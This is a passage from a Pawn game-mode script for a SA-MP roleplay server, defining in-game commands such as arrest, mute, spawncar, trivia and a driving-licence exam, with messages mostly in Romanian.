		mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `PhoneNr`='%e' LIMIT 1", number);
		mysql_tquery(SQL, gQuery, "sql_new_phone2", "is", playerid, number);
		return true;
	}
	else {
		SendClientMessage(playerid, COLOR_GREY, "NU POTI FACE ASTA");
	}
	return true;
}
cmd:arrest(playerid, params[])  {
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea politiei.");
	if(OnDuty[playerid] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");
	new id,string[186];
	if(sscanf(params, "u", id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/arrest <playerid/name>");
	if(!IsPlayerConnected(id) || !IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	if(PlayerToPoint(10, playerid, -1606.2657,675.1262,-5.2422) || PlayerToPoint(10, playerid, 1526.5613,-1677.7168,5.8906) || PlayerToPoint(10.0, playerid, 2281.6555,2429.8877,3.2734)) {	
		if(GetDistanceBetweenPlayers(playerid,id) > 10) return SendClientMessage(playerid,-1, "Acel player nu este langa tine.");
		if(PlayerInfo[id][pWantedLevel] < 1) return SendClientMessage(playerid, COLOR_GREY, "Acel player nu are wanted.");
		AddFactionRaport(playerid, 0);	
		ClearCrime(id);
		GivePlayerCash(id, -(PlayerInfo[id][pWantedLevel]*2000));
		GivePlayerCash(playerid, PlayerInfo[id][pWantedLevel]*2000);
		ResetWeapons(id);
		PlayerInfo[id][pJailTime] = PlayerInfo[id][pWantedLevel] * 250;
		SetPlayerWantedLevel(id, 0);					
		format(string, sizeof(string), "You have been arrested by %s for %d seconds, and issued a fine of $%d.", GetName(playerid), PlayerInfo[id][pJailTime],  PlayerInfo[id][pWantedLevel]*350);
		SendClientMessage(id, COLOR_LIGHTBLUE, string);
		PlayerInfo[id][pJailed] = 1;					
		ClearCrime(id);
		_query("UPDATE `users` SET `Jailed` = '%i', `JailTime` = '%i' WHERE `id` = '%i'", PlayerInfo[id][pJailed], PlayerInfo[id][pJailTime], PlayerInfo[id][pSQLID]);
		CheckMission(playerid, 9);
		PutPlayerInJail(id);
		if(PlayerCuffed2[id] == 1) {
			PlayerCuffed2[id] = 0;
			SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
			RemovePlayerAttachedObject(id,1);
			TogglePlayerControllable(id, 1);
		}
		format(string, sizeof(string), "%s arrested suspect %s, issuing a fine of $%d with a sentence of %d seconds.", GetName(playerid), GetName(id), PlayerInfo[id][pWantedLevel]*350, PlayerInfo[id][pJailTime]);
		SCMTA(COLOR_LIGHTRED, string);
		SendClientMessage(id, COLOR_GOLD, "Ai la dispozitie comanda (/jailmenu) pentru a iesi in curtea inchisorii.");
		PlayerInfo[id][pWantedLevel] = 0;
		PlayerTextDrawHide(id, WantedTD);		
	}
	else SendClientMessage(playerid, COLOR_GREY, "Nu esti in zona inchisorii.");
	return true;
}
cmd:trival(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti autorizat sa folosesti aceasta comanda");
	new text[30], premium;
	if(sscanf(params, "is[30]", premium, text)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/trival <parize> <text>");
	if(strlen(text) < 5 || strlen(text) >= 30) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Texctu trebuie sa fie intre 5 si 30 de caractere.");
	if(premium < 1 || premium > 2000000000) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Poti pune intre $1 si $2.000.000.000.");
	format(TrivalText, 30, text);
	TrivalPremium = premium;
	TrivalEvent = 1;
	gString[0] = EOS;
	format(gString, 180, "In acest moment este activ un event de tip 'Trivia' organizat de administratorul {ff9189}%s{FFFFFF}.", GetName(playerid));
	SCMTA(COLOR_WHITE, gString);
	format(gString, 180, "Primul jucator ce tasteaza in chat '{4ca8ff}%s{FFFFFF}' castiga suma de {95ff60}$%s{FFFFFF}.", TrivalText, FormatNumber(TrivalPremium));
	SCMTA(COLOR_WHITE, gString);
	return true;
}

cmd:accs(playerid) {
	ShowAccsTextdraws(playerid);
	SelectTextDraw(playerid, COLOR_CLIENT);
	return player_selected[playerid] = 24;
}


cmd:spawncar(playerid, params[]) {
	if(!PlayerInfo[playerid][pAdmin]) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new carid; else return SendUsageMsg(playerid, "spawncar [car id]");
	if(!(400 <= carid <= 611)) return SendErrorMsg(playerid, "Invalid car ID.");

	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);

	new carID = CreateVehicle(carid, x, y, z, 0, random(255), random(255), -1, 0);
	PutPlayerInVehicle(playerid, carID, 0);

	Carspawn[carID] = true; Gas[carID] = 100;

	LinkVehicleToInterior(carID, GetPlayerInterior(playerid));
	SetVehicleVirtualWorld(carID, GetPlayerVirtualWorld(playerid));
	SetVehicleNumberPlate(carID, "AdmCar");
	return SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s a spawnat un %s", 1, GetName(playerid), aVehicleNames[carid-400]);
}

cmd:vre(playerid, params[]) {
    if(!PlayerInfo[playerid][pAdmin]) return SendErrorMsg(playerid, AdminOnly);
	if(IsPlayerInAnyVehicle(playerid)) SetVehicleToRespawn(GetPlayerVehicleID(playerid));

	extract params -> new carid; else return SendUsageMsg(playerid, "vre [car id]");
	if(Carspawn[carid]) DestroyVehicleEx(carid, "vre"), Carspawn[carid] = false;
	return SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s a respawnat vehiculul %d!", 1, GetName(playerid), carid);
}

cmd:rac(playerid) {
	if(PlayerInfo[playerid][pAdmin] < 3) return SendErrorMsg(playerid, AdminOnly);
	for(new car=1;car<=GetVehiclePoolSize();car++) if(!IsVehicleOccupied(car)) SetVehicleToRespawn(car); 
	return SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s a respawnat toate vehiculele nefolosite!", 1, GetName(playerid));
}

cmd:tod(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);
	new hour;
	if(sscanf(params, "i", hour)) return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/tod <timp>");
	SetWorldTime(hour);
	return true;
}
cmd:weather(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);
	new weather;
	if(sscanf(params, "i",weather)) return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/weather <id>");
	if(weather < 0||weather > 45) return SendClientMessage(playerid, -1, "Vreme invalida (1-45).");
	SetWeather(weather);
	return true;
}
cmd:sett(playerid, params[]) {
	if(PlayerInfo[playerid][pVip] < 1) return SendClientMessage(playerid, COLOR_GREY, "* Nu ai acces la aceasta comanda!");
	new hour, string[30];
	if(sscanf(params, "i", hour)) return SendClientMessage(playerid, -1, "USAGE: /sett <time (0-23)>");
	if(hour < 0 || hour > 23) return SendClientMessage(playerid, -1, "Invalid time!");
	SetPlayerTime(playerid, hour, 0);
	format(string, sizeof(string), "Time set to %d", hour);
	SendClientMessage(playerid, COLOR_LGREEN, string);
	return true;
}
cmd:setw(playerid, params[]) {
	if(PlayerInfo[playerid][pVip] < 1) return SendClientMessage(playerid, COLOR_GREY, "* Nu ai acces la aceasta comanda!");
	new weather, string[30];
	if(sscanf(params, "i", weather)) return SendClientMessage(playerid, -1, "USAGE: /setw <weather id (0-20)>");
	if(weather < 0 || weather > 45) return SendClientMessage(playerid, -1, "Invalid weather!");
	SetPlayerWeather(playerid, weather);
	format(string, sizeof(string), "Weather set to %d", weather);
	SendClientMessage(playerid, COLOR_LGREEN, string);
	return true;
}
cmd:slap(playerid, params[]) {
	if !IsHelper(playerid, 1) && !IsAdmin(playerid, 1) *then 
		return SendClientMessage(playerid, COLOR_WHITE,"Nu ai acces la aceasta comanda.");

	extract params -> new player:id; else
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/slap <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	new Float:slx, Float:sly, Float:slz;
	GetPlayerPos(id, slx, sly, slz);
	SetPlayerPos(id, slx, sly, slz+5);
	PlayerPlaySound(id, 1190, slx, sly, slz+5);
	format(gString, 128, "(/slap): {FFFFFF}%s has slapped %s.", GetName(playerid), GetName(id));
	SendAdminMessage(COLOR_LIGHTRED, gString, 1);
	SCMf(id, 0xFFADADFF, "You have been slapped by %s.", GetName(playerid));
	SCMf(playerid, 0xFFADADFF, "You have slaped %s.", GetName(id));
	return true;
}

cmd:up(playerid, params[]) {
	if !IsHelper(playerid, 1) && !IsAdmin(playerid, 1) *then 
		return SendClientMessage(playerid, COLOR_WHITE,"Nu ai acces la aceasta comanda.");

	new Float:slx, Float:sly, Float:slz;
	GetPlayerPos(playerid, slx, sly, slz);
	SetPlayerPos(playerid, slx, sly, slz+5);
	return true;
}
cmd:money(playerid, params[]) {
	if !IsAdmin(playerid, 6) *then
		return SendClientMessage(playerid, COLOR_LGREEN, AdminOnly);

	extract params -> new player:id, string:money[15]; else
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/money <playerid/name> <Suma>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	if !isBigInt(money) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Money invalid.");

	resetBigInt(money[id]),converBytes(money[id],money);
	ResetPlayerMoney(playerid);
	GivePlayerMoney(playerid, bytes32(money[id]));
	ABroadcast(COLOR_LIGHTRED, 5, "(/money):{FFFFFF} Admin %s has set %s's money to $%s.", GetName(playerid), GetName(id), formatBytes(money[id]));
	SCMf(id, COLOR_WHITE, "Admin %s ti-a setat banii la $%s.", GetName(playerid), formatBytes(money[id]));
	return true;
}

stock GiveVehicle(playerid, const modelid, bool:premium=false) {
	mysql_format(SQL, gQuery, sizeof gQuery, "INSERT INTO cars (Model) VALUES (%d)", modelid);
	mysql_tquery(SQL, gQuery, #give_player_vehicle, #iii, playerid, modelid, premium);
	return true;
}

redist::give_player_vehicle(playerid, const modelid, bool:premium) {
	new const idd = Iter_Free(MyVehicle<>); CarInfo[idd]=v_init();
	CarInfo[idd][Userid] = PlayerInfo[playerid][pSQLID];

	CarInfo[idd][cID] = cache_insert_id();
	CarInfo[idd][cModel] = modelid;
	CarInfo[idd][cPremium] = premium;
	new _rand=random(sizeof(DealerCarPos));
	strmid(CarInfo[idd][cOwner], PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);

	new i=-1;
	while(i<=2) CarInfo[idd][cLocationx + cInfo:++i]=_:DealerCarPos[_rand][i];
	Iter_Add(MyVehicle<playerid>, idd); saveCar(idd);
	
	if MyVehicleSpawn[playerid] != (!PlayerInfo[playerid][pReborn]?4:6) *then SpawnPlayerCar(playerid, idd);
	return true;
}

redist::InsertClanVehicle(clanid, modelid, value) {
	new idd = Iter_Free(MyVehicle<>); CarInfo[idd] = v_init();
	Iter_Add(MyVehicle<clanid+MAX_PLAYERS>, idd);
	CarInfo[idd][cID] = cache_insert_id();
	CarInfo[idd][cModel] = modelid; CarInfo[idd][cValue] = value;
	CarInfo[idd][cClan] = clanid; CarInfo[idd][cRank] = 1;
	CarInfo[idd][cLock] = false;

	new i=-1,_rand = random(sizeof(DealerCarPos));
	while(i<=2) CarInfo[idd][cLocationx + cInfo:(++i)]=_:DealerCarPos[_rand][i];

	gQuery[0] = (EOS);
	mysql_format(SQL, gQuery, sizeof(gQuery),
		"UPDATE clanvehicle SET Model='%d', Locationx='%f', Locationy='%f', Locationz='%f', Angle='%f', ColorOne='%d', ColorTwo='%d', Value='%d', ClanID='%i', Rank='1' WHERE ID=%d",
	CarInfo[idd][cModel], CarInfo[idd][cLocationx], CarInfo[idd][cLocationy], CarInfo[idd][cLocationz], CarInfo[idd][cAngle], CarInfo[idd][cColorOne], CarInfo[idd][cColorTwo], CarInfo[idd][cValue], clanid, CarInfo[idd][cID]);
	mysql_tquery(SQL, gQuery, "", "");

	return ClanSpawn[clanid]<=6?SpawnClanCar(idd):1;
}

cmd:mute(playerid, params[]) {
	if !IsAdmin(playerid, 1) && IsHelper(playerid, 2) *then
		return SendClientMessage(playerid, COLOR_LGREEN, AdminOnly);

	extract params -> new player:id, time, string:reason[60]; else
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/mute <playerid/name> <Time(minutes)> <reason>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsAdmin(playerid, PlayerInfo[id][pAdmin]) *then
		return SendClientMessage(playerid, -1, "Acel player are adminul mai mare ca tine!");
	
	PlayerInfo[id][pMuted] = 1;
	PlayerInfo[id][pMuteTime] = time*60;
	PlayerInfo[id][pChatCMD] = 11;
	PlayerTextDrawHide(id, ChatCMD);
	SCMf(id, COLOR_WHITE, "* Ai primit mute de la %s pentru %d minute, motiv: %s.", GetName(playerid),time,reason);
	format(gString, 128, "AdmCmd: %s a primit mute de la %s pentru %d minute, motiv: %s.", GetName(id), GetName(playerid),time, reason);
	SCMTA(COLOR_LIGHTRED, gString);
	_query("UPDATE users SET `Muted`='1',`MuteTime`='%d', `Mutes`=`Mutes`+'1' WHERE `ID`='%d'",PlayerInfo[id][pMuteTime], PlayerInfo[id][pSQLID]);
	InsereazaSanctiune(id, playerid, MUTE, reason);
	updateRaport(playerid);				
	return true;
}
cmd:unmute(playerid, params[]) {
	if !IsAdmin(playerid, 1) *then 
		return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);

	extract params -> new player:id; else 
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/unmute <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	PlayerInfo[id][pMuted] = 0;
	PlayerInfo[id][pMuteTime] = 0;
	PlayerInfo[id][pChatCMD] = 0;
	SCMf(id, COLOR_WHITE, "* Ai primit unmute de la Adminul %s.", GetName(playerid));
	format(gString, 128, "AdmCmd: %s i-a dat unmute lui %s.", GetName(playerid),GetName(id));
	SendAdminMessage(COLOR_WHITE, gString, 3);
	_query("UPDATE users SET `Muted`='0',`MuteTime`='0' WHERE `ID`='%d'", PlayerInfo[id][pSQLID]);
	return true;
}
redist::TotalUsers() return ServerAccounts = cache_num_rows();
cmd:exam(playerid, params[]) {
	if(CP[playerid] != 0 || targetfind[playerid] != -1) 
		return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
	
	if(!PlayerToPoint(2, playerid, 2183.1238,2295.2339,10.8203)) 
		return SendClientMessage(playerid, -1, "Nu esti la DMV!");

	if(PlayerInfo[playerid][pCarLic] > 0) 
		return SendClientMessage(playerid, -1, "Eroare: Ai deja licenta de condus.");

	if(PlayerInfo[playerid][pCarLicS] > 0) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Permisul ti-a fost confiscat recent, nu-l poti lua inca!");
	
	if(InExamen[playerid]) 
		return SendClientMessage(playerid, -1, "Esti deja in examen!");


	if(PlayerInfo[playerid][pTutorial]) {
		if(GetPlayerCash(playerid) < 10000)
			return SCMf(playerid, -1, "Ai nevoie de $%s pentru a da examenul!", FormatNumber(10000));
	}
	else {
		if(GetPlayerCash(playerid) < PlayerInfo[playerid][pLevel]*100000)
			return SCMf(playerid, -1, "Ai nevoie de $%s pentru a da examenul!", FormatNumber(PlayerInfo[playerid][pLevel]*100000));
	}

	InExamen[playerid] = 1;
	ShowExam(playerid);
	return true;
}

stock ShowExam(playerid) {
	player_selected[playerid] = 6;
	SelectTextDraw(playerid, COLOR_LGREEN);
	SetPlayerCameraPos(playerid, 2118.928955, 2264.740478, 79.353942);
	SetPlayerCameraLookAt(playerid, 2122.359130, 2266.712890, 76.297256);
	SendClientMessage(playerid, COLOR_WHITE, "{BA0404}Examen: {FFFFFF}Ai inceput examenul pentru permisul auto. Pentru inceput, trebuie sa raspunzi la 5 intrebari. (intrebare gresita = fail)");
	for(new i=0;i<8;i++) TextDrawShowForPlayer(playerid, ExamTD[i]);
	ExamPTD[playerid][0] = CreatePlayerTextDraw(playerid, 144.899932, 166.600067, "~b~00:30");
	PlayerTextDrawLetterSize(playerid, ExamPTD[playerid][0], 0.374500, 1.319375);
	PlayerTextDrawAlignment(playerid, ExamPTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, ExamPTD[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, ExamPTD[playerid][0], 1);
	PlayerTextDrawBackgroundColor(playerid, ExamPTD[playerid][0], 105);
	PlayerTextDrawFont(playerid, ExamPTD[playerid][0], 3);
	PlayerTextDrawSetProportional(playerid, ExamPTD[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][0], 0);
	PlayerTextDrawShow(playerid, ExamPTD[playerid][0]);

	ExamPTD[playerid][1] = CreatePlayerTextDraw(playerid, 321.000152, 187.375000, "");
	PlayerTextDrawLetterSize(playerid, ExamPTD[playerid][1], 0.318998, 1.333124);
	PlayerTextDrawTextSize(playerid, ExamPTD[playerid][1], 0.000000, 334.000000);
	PlayerTextDrawAlignment(playerid, ExamPTD[playerid][1], 2);
	PlayerTextDrawColor(playerid, ExamPTD[playerid][1], -1);
	PlayerTextDrawUseBox(playerid, ExamPTD[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, ExamPTD[playerid][1], 1152799743);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, ExamPTD[playerid][1], 1);
	PlayerTextDrawBackgroundColor(playerid, ExamPTD[playerid][1], 255);
	PlayerTextDrawFont(playerid, ExamPTD[playerid][1], 1);
	PlayerTextDrawSetProportional(playerid, ExamPTD[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][1], 0);
	PlayerTextDrawShow(playerid, ExamPTD[playerid][1]);

	ExamPTD[playerid][2] = CreatePlayerTextDraw(playerid, 208.000000, 213.187500, "");
	PlayerTextDrawLetterSize(playerid, ExamPTD[playerid][2], 0.253000, 1.416250);
	PlayerTextDrawTextSize(playerid, ExamPTD[playerid][2], 15.000000, 105.000000);
	PlayerTextDrawAlignment(playerid, ExamPTD[playerid][2], 2);
	PlayerTextDrawColor(playerid, ExamPTD[playerid][2], -1);
	PlayerTextDrawUseBox(playerid, ExamPTD[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid, ExamPTD[playerid][2], 1152799558);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, ExamPTD[playerid][2], 1);
	PlayerTextDrawBackgroundColor(playerid, ExamPTD[playerid][2], 255);
	PlayerTextDrawFont(playerid, ExamPTD[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid, ExamPTD[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid, ExamPTD[playerid][2], true);
	PlayerTextDrawShow(playerid, ExamPTD[playerid][2]);

	ExamPTD[playerid][3] = CreatePlayerTextDraw(playerid, 321.000000, 213.187500, "");
	PlayerTextDrawLetterSize(playerid, ExamPTD[playerid][3], 0.253000, 1.416250);
	PlayerTextDrawTextSize(playerid, ExamPTD[playerid][3], 15.000000, 105.000000);
	PlayerTextDrawAlignment(playerid, ExamPTD[playerid][3], 2);
	PlayerTextDrawColor(playerid, ExamPTD[playerid][3], -1);
	PlayerTextDrawUseBox(playerid, ExamPTD[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid, ExamPTD[playerid][3], 1152799558);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, ExamPTD[playerid][3], 1);
	PlayerTextDrawBackgroundColor(playerid, ExamPTD[playerid][3], 255);
	PlayerTextDrawFont(playerid, ExamPTD[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, ExamPTD[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, ExamPTD[playerid][3], true);
	PlayerTextDrawShow(playerid, ExamPTD[playerid][3]);

	ExamPTD[playerid][4] = CreatePlayerTextDraw(playerid, 434.000000, 213.187500, "");
	PlayerTextDrawLetterSize(playerid, ExamPTD[playerid][4], 0.253000, 1.416250);
	PlayerTextDrawTextSize(playerid, ExamPTD[playerid][4], 15.000000, 105.000000);
	PlayerTextDrawAlignment(playerid, ExamPTD[playerid][4], 2);
	PlayerTextDrawColor(playerid, ExamPTD[playerid][4], -1);
	PlayerTextDrawUseBox(playerid, ExamPTD[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid, ExamPTD[playerid][4], 1152799558);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, ExamPTD[playerid][4], 1);
	PlayerTextDrawBackgroundColor(playerid, ExamPTD[playerid][4], 255);
	PlayerTextDrawFont(playerid, ExamPTD[playerid][4], 1);
	PlayerTextDrawSetProportional(playerid, ExamPTD[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, ExamPTD[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid, ExamPTD[playerid][4], true);
	PlayerTextDrawShow(playerid, ExamPTD[playerid][4]);

	PlayerTextID[playerid][PlayerText:ExamPTD[playerid][2]] = 0;
	PlayerTextID[playerid][PlayerText:ExamPTD[playerid][3]] = 1;
	PlayerTextID[playerid][PlayerText:ExamPTD[playerid][4]] = 2;
	StepExam[playerid]=0;
	ExamTime[playerid] = 30;
	updateExam(playerid);
	return true;
}
stock updateExam(playerid) {
	PlayerTextDrawSetString(playerid, ExamPTD[playerid][1], examInfo[StepExam[playerid]][e_TITLE]);
	PlayerTextDrawSetString(playerid, ExamPTD[playerid][2], examInfo[StepExam[playerid]][e_RASP1]);
	PlayerTextDrawSetString(playerid, ExamPTD[playerid][3], examInfo[StepExam[playerid]][e_RASP2]);
	PlayerTextDrawSetString(playerid, ExamPTD[playerid][4], examInfo[StepExam[playerid]][e_RASP3]);
	return true;
}

stock StartDMV(playerid) {
	SetPlayerInterior(playerid, 0);
	ExamCar[playerid] = CreateVehicleEx(589, 2179.5417,2285.7588,10.2952,89.2036, 37, 37);
	Gas[ExamCar[playerid]] = 100;
	SetVehicleNumberPlate(ExamCar[playerid], "{FF0000}DMV");
	SetVehicleVirtualWorld(ExamCar[playerid], GetPlayerVirtualWorld(playerid));
	CP[playerid] = 100;
	SetPlayerRaceCheckpoint(playerid,0, DMVCP[CP[playerid]-100][0], DMVCP[CP[playerid]-100][1], DMVCP[CP[playerid]-100][2], DMVCP[CP[playerid]-99][0], DMVCP[CP[playerid]-99][1], DMVCP[CP[playerid]-99][2],8.0);
	new engine,lights,alarm,bonnet,boot,objective, x = CreateDynamicObject(19309,0,0,0,0,0,0);
	SetDynamicObjectMaterialText(x, 0, "DMV", 50, "Arial", 27, 1, COLOR_WHITE, 0xFF000000, 1);
	AttachDynamicObjectToVehicle(x, ExamCar[playerid], -0.004999, -0.829999, 1.164999, 0.000000, 0.000000, 0.000000);
	SetPVarInt(playerid, "ObjExam", x);
	SetVehicleParamsEx(ExamCar[playerid],engine,lights,alarm,1,bonnet,boot,objective);
	PutPlayerInVehicleEx(playerid, ExamCar[playerid], 0);
	return true;
}
stock FailExamen(playerid) {
	DestroyVehicleEx(ExamCar[playerid], "");
	ExamCar[playerid] = 0;
	InExamen[playerid] = 0;
	DisableRemoteVehicleCollisions(playerid, 0);
	DisablePlayerRaceCheckpointEx(playerid);
	DestroyDynamicObject(GetPVarInt(playerid, "ObjExam"));
	CP[playerid] = 0;
	return true;
}
cmd:smoke(playerid, params[]) {
	if(PlayerInfo[playerid][pLighter] == 0) return SendClientMessage(playerid, -1, "Nu ai o bricheta.");
    if(IsSmoking[playerid] != 0) return SendClientMessage(playerid, -1, "Fumezi deja.");
	if(PlayerInfo[playerid][pCigarettes] == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu ai o tigara.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_GREY, "Nu poti folosi comanda in vehicule.");
	PlayerInfo[playerid][pLighter] -= 1;
	PlayerInfo[playerid][pCigarettes] -= 1;
	IsSmoking[playerid] = 60;
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
	return true;
}


cmd:buy(playerid, params[]) {
    //if(IsPlayerInRangeOfPoint(playerid,100.0,6.1884,-28.4153,1003.5494) || IsPlayerInRangeOfPoint(playerid,100.0,-30.6147,-89.6600,1003.5469) || IsPlayerInRangeOfPoint(playerid,100.0,-26.0890,-185.8300,1003.5469) || IsPlayerInRangeOfPoint(playerid,100.0,-27.3123,-29.2776,1003.5573) || IsPlayerInRangeOfPoint(playerid,100.0,-25.1326,-139.0670,1003.5469)) return SendErrorMsg(playerid, "Nu esti intr-un magazin 24/7.");
	//if(!GetPlayerInterior(playerid)) return SendErrorMsg(playerid, "Nu esti intr-un magazin 24/7.");

	new szDialog2[500];
	if(PlayerInfo[playerid][pTutorial] < 5) {
		strcat(szDialog2, "Item\tPrice\n");
		strcat(szDialog2, !RegisrationStep[playerid][0] ? "Phone\t$100,000\n" : "{FF0000}Phone\t100,000\n");
		strcat(szDialog2, !RegisrationStep[playerid][1] ? "PhoneBook\t$75,000\n" : "{FF0000}PhoneBook\t$75,000\n");
		strcat(szDialog2, !RegisrationStep[playerid][2] ? "Credite\t$50,000\n" : "{FF0000}Credite\t$50,000\n");
	}
	else {
		strcat(szDialog2, "Item\tPrice\n");
		strcat(szDialog2, "{FFFFFF}Phone\t$100,000\n");
		strcat(szDialog2, "{FFFFFF}PhoneBook\t$75,000\n");
		strcat(szDialog2, "{FFFFFF}Credite\t$50,000\n");		
	}	
	strcat(szDialog2, "{FFFFFF}Walkie Talkie\t$150,000\n");
	strcat(szDialog2, "{FFFFFF}Lighter\t$50,000\n");
	strcat(szDialog2, "{FFFFFF}Cigarettes\t$10,000\n");	
	strcat(szDialog2, "{FFFFFF}Gascan\t$200,000\n");
    return ShowPlayerDialog(playerid, DIALOG_STORE,DIALOG_STYLE_TABLIST_HEADERS,"24/7 Store",szDialog2,"Select","Cancel");
}

cmd:eject(playerid, params[]) {
    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMsg(playerid, "Trebuie sa fii intr-un vehicul pentru a folosi aceasta comanda.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMsg(playerid, "Trebuie sa fi la volan pentru a folosi aceasta comanda!");
	extract params -> new player:id; else return SendUsageMsg(playerid, "eject [id]");
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");
	if(PlayerTied[id] > 0) return SendErrorMsg(playerid, "Acel player este legat!");
	if(id == playerid) return SendErrorMsg(playerid, "Nu iti poti da eject singur.");

	if(IsPlayerInVehicle(id, GetPlayerVehicleID(playerid)) || GetPlayerSurfingVehicleID(id) == GetPlayerVehicleID(playerid)) {
		if(GetPlayerSurfingVehicleID(id) == GetPlayerVehicleID(playerid)) SlapPlayer(id);
		ProxDetector(15.0, playerid, "* %s has thrown %s out of their vehicle.", COLOR_PURPLE, GetName(playerid), GetName(id));
		va_SendClientMessage(playerid, COLOR_LIGHTBLUE, "L-ai dat pe %s afara din vehicul!", GetName(id));
		va_SendClientMessage(id, COLOR_LIGHTBLUE, "Ai fost dat afara din vehicul de %s !", GetName(playerid));
		RemovePlayerFromVehicleEx(id);
	}
	return true;
}
cmd:tie(playerid, params[]) {
	if(!IsAMember(playerid)) return SendErrorMsg(playerid, "Nu faci parte dintr-o mafie.");
	if(PlayerInfo[playerid][pRank] < 2) return SendErrorMsg(playerid, "Ai nevoie rank 2+ pentru a face asta.");
	extract params -> new player:id; else return SendUsageMsg(playerid, "tie [id]");
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");
	if(!ProxDetectorS(8.0, playerid, id)) return SendErrorMsg(playerid, "Acel player nu este langa tine!");
	if(id == playerid) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda pe tine!");

	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && IsPlayerInVehicle(id, (GetPlayerVehicleID(playerid)))) {
		va_SendClientMessage(id, COLOR_LIGHTBLUE, "Ai fost legat de %s.", GetName(playerid));
		va_SendClientMessage(playerid, COLOR_LIGHTBLUE, "L-ai legat pe %s.", GetName(id));
		ProxDetector(30.0, playerid, "* %s l-a legat pe %s.", COLOR_PURPLE, GetName(playerid) ,GetName(id));
		TogglePlayerControllable(id, 0);
		PlayerTied[id] = 1;
	}
	else SendErrorMsg(playerid, "Acel player nu este in vehiculul tau sau nu esti la volan!");
	return true;
}
cmd:untie(playerid, params[]) {
	if(!IsAMember(playerid) && !IsACop(playerid)) return SendErrorMsg(playerid, "Nu esti mafiot.");
